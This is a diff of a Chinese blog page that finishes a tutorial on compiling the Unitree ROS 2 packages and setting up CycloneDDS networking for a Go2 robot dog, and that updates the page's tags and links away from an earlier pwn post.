unitree_hg<br></code></pre></td></tr></table></figure>
+
+<p>这是一个经典的 empy 版本兼容性问题。ROS 2 Humble 需要 empy 3.3.x 版本，但我安装了 4.2.1 版本，导致 API 不兼容。</p>
+<p>我们重新安装正确的版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwn@pwn:~/Desktop/unitree/unitree_ros2/cyclonedds_ws$ pip3 uninstall empy -y<br>Found existing installation: empy 4.2.1<br>Uninstalling empy-4.2.1:<br>  Successfully uninstalled empy-4.2.1<br>pwn@pwn:~/Desktop/unitree/unitree_ros2/cyclonedds_ws$ pip3 install empy==3.3.4<br>Defaulting to user installation because normal site-packages is not writeable<br>Requirement already satisfied: empy==3.3.4 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (3.3.4)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/unitree_go_1/3png.png" srcset="/img/loading.gif" lazyload alt="好啦!"></p>
+<h2 id="编译一个消息包和实例"><a href="#编译一个消息包和实例" class="headerlink" title="编译一个消息包和实例"></a>编译一个消息包和实例</h2><h3 id="加载-DDS-环境并编译消息包"><a href="#加载-DDS-环境并编译消息包" class="headerlink" title="加载 DDS 环境并编译消息包"></a>加载 DDS 环境并编译消息包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Desktop/unitree/unitree_ros2/cyclonedds_ws<br><span class="hljs-built_in">source</span> install/setup.bash<br><br><span class="hljs-comment"># 编译消息定义包</span><br>colcon build --packages-select unitree_go unitree_hg unitree_api<br></code></pre></td></tr></table></figure>
+
+<h3 id="编译示例程序"><a href="#编译示例程序" class="headerlink" title="编译示例程序"></a>编译示例程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Desktop/unitree/unitree_ros2/example<br>colcon build<br></code></pre></td></tr></table></figure>
+
+<p>验证一下结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> ~/Desktop/unitree/unitree_ros2/example/install/unitree_ros2_example/bin/<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/unitree_go_1/3png.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/unitree_go_1/4.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>找一下你的网卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwn@pwn:~/Desktop/unitree/unitree_ros2/example$ ip a | grep <span class="hljs-string">&quot;^[0-9]&quot;</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000<br>4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br></code></pre></td></tr></table></figure>
+
+<p>修改 setup.sh：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Desktop/unitree/unitree_ros2<br><span class="hljs-built_in">sudo</span> vim setup.sh<br></code></pre></td></tr></table></figure>
+
+<p>将文件修改为（把 YOUR_NETWORK_INTERFACE 换成你的实际网卡名）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Setup unitree ros2 environment&quot;</span><br><span class="hljs-built_in">source</span> /opt/ros/humble/setup.bash<br><span class="hljs-built_in">source</span> ~/Desktop/unitree/unitree_ros2/cyclonedds_ws/install/setup.bash<br><span class="hljs-built_in">export</span> RMW_IMPLEMENTATION=rmw_cyclonedds_cpp<br><span class="hljs-built_in">export</span> CYCLONEDDS_URI=<span class="hljs-string">&#x27;&lt;CycloneDDS&gt;&lt;Domain&gt;&lt;General&gt;&lt;Interfaces&gt;</span><br><span class="hljs-string">                            &lt;NetworkInterface name=&quot;YOUR_NETWORK_INTERFACE&quot; priority=&quot;default&quot; multicast=&quot;default&quot; /&gt;</span><br><span class="hljs-string">                        &lt;/Interfaces&gt;&lt;/General&gt;&lt;/Domain&gt;&lt;/CycloneDDS&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后添加网卡配置并重新加载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 加载环境</span><br><span class="hljs-built_in">cd</span> ~/Desktop/unitree/unitree_ros2<br><span class="hljs-built_in">source</span> ./setup.sh<br></code></pre></td></tr></table></figure>
+
+<h2 id="通信测试"><a href="#通信测试" class="headerlink" title="通信测试"></a>通信测试</h2><p>我们先使用AP模式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 连接 Go2 热点</span><br>nmcli dev wifi list  <span class="hljs-comment"># 查看可用网络</span><br>nmcli dev wifi connect <span class="hljs-string">&quot;Go2_XXXXXX&quot;</span> password <span class="hljs-string">&quot;12345678&quot;</span><br><br><span class="hljs-comment"># 2. 测试连接</span><br>ping 192.168.64.1<br></code></pre></td></tr></table></figure>
+
+<p>貌似需要一个无线网卡，先就等到下周继续补完</p>
 
                 
               </div>
@@ -562,7 +574,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/fmtstr/" class="category-chain-item">fmtstr</a>
+  <a href="/categories/Unitree/" class="category-chain-item">Unitree</a>
   
   
 
@@ -577,9 +589,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" class="print-no-link">#格式化字符串漏洞</a>
+        <a href="/tags/Unitree/" class="print-no-link">#Unitree</a>
       
-        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+        <a href="/tags/Unitree-Go2/" class="print-no-link">#Unitree Go2</a>
+      
+        <a href="/tags/%E5%AE%87%E6%A0%91%E6%9C%BA%E5%99%A8%E7%8B%97/" class="print-no-link">#宇树机器狗</a>
       
     </div>
   
@@ -591,8 +605,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>【PWN.0x02】Linux PWN：Hijack Got</div>
-      <div>https://zer0ptr.github.io/2026/01/24/fmtstr-exploit-hijackgot/</div>
+      <div>【ROBOT.0x00】如何在不拆开机器狗的情况下优雅地对其进行二开</div>
+      <div>https://zer0ptr.github.io/2026/05/06/unitree-debug-learning-1/</div>
     </div>
     <div class="license-meta">
       
@@ -604,13 +618,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年1月24日</div>
+          <div>2026年5月6日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年5月2日</div>
+          <div>2026年5月8日</div>
         </div>
       
       
@@ -641,18 +655,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/01/24/RefleXGenThe_unexamined_code_is_not_worth_using/" title="【论文笔记】RefleXGen：The unexamined code is not worth using">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【论文笔记】RefleXGen：The unexamined code is not worth using</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/01/23/fmtstr-exploit-x64/" title="【PWN.0x00】Linux PWN：fmtstr exploit in x64">
-                        <span class="hidden-mobile">【PWN.0x00】Linux PWN：fmtstr exploit in x64</span>
+                      <a href="/2026/05/05/kpti-bypass/" title="【PWN.0x0E】Linux Kernel Pwn：Kernel ROP with KPTI bypass">
+                        <span class="hidden-mobile">【PWN.0x0E】Linux Kernel Pwn：Kernel ROP with KPTI bypass</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
